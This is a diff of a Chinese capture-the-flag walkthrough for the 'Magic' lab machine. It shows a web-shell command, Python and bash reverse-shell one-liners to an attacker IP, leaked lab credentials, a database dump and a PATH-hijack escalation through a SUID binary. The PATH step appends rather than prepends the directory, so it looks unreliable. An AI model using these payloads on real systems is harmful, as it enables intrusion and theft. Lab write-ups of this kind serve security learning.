@@ -36,4 +36,58 @@ index.php下有图片，可以查看图片的路径，替换为自己上传的�
 
 ![image-20250402175104411](Magic/image-20250402175104411.png)
 
-![image-20250402181042339](Magic/image-20250402181042339.png)
+可以命令执行
+
+![image-20250403102239859](Magic/image-20250403102239859.png)
+
+反弹shell
+
+```
+10.10.10.185/images/uploads/x.php.png?cmd=python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.16.3",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
+```
+
+![image-20250403111432899](Magic/image-20250403111432899.png)
+
+```
+theseus:iamkingtheseus
+```
+
+/etc/passwd中也存在用户，但是使用改密码ssh无法连接
+
+该靶机不存在mysql，但是存在mysqldump， mysqldump是对数据库进行备份的一个工具，利用该账号对数据库进行备份，就可以看到数据库中的内容
+
+```
+mysqldump -A -u theseus -p  > all_database.sql
+```
+
+![image-20250403113338213](Magic/image-20250403113338213.png)
+
+```
+admin:Th3s3usW4sK1ng
+```
+
+数据库中有admin账号密码，上面bd.php5中的username是`theseus`，这个密码应该就是theseus的密码,利用改密码成功切换到theseus用户
+
+![image-20250403140649661](Magic/image-20250403140649661.png)
+
+## 提权
+
+查看有suid权限的文件，其中有一个/bin/sysinfo，运行后会打印系统信息
+
+![image-20250403142053598](Magic/image-20250403142053598.png)
+
+查看该进程调用的系统库，调用了fdisk这个文件，提权思路就是写一个反弹shell的fdisk让sysinfo来以root权限调用
+
+![image-20250403142255249](Magic/image-20250403142255249.png)
+
+```shell
+theseus@magic:/dev/shm$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.16.3/4444 0>&1' > fdisk
+
+theseus@magic:/dev/shm$ chmod +x fdisk
+
+theseus@magic:/dev/shm$ export PATH=$PATH:/dev/shm
+
+theseus@magic:/dev/shm$ sysinfo
+```
+
+![image-20250403143522212](Magic/image-20250403143522212.png)
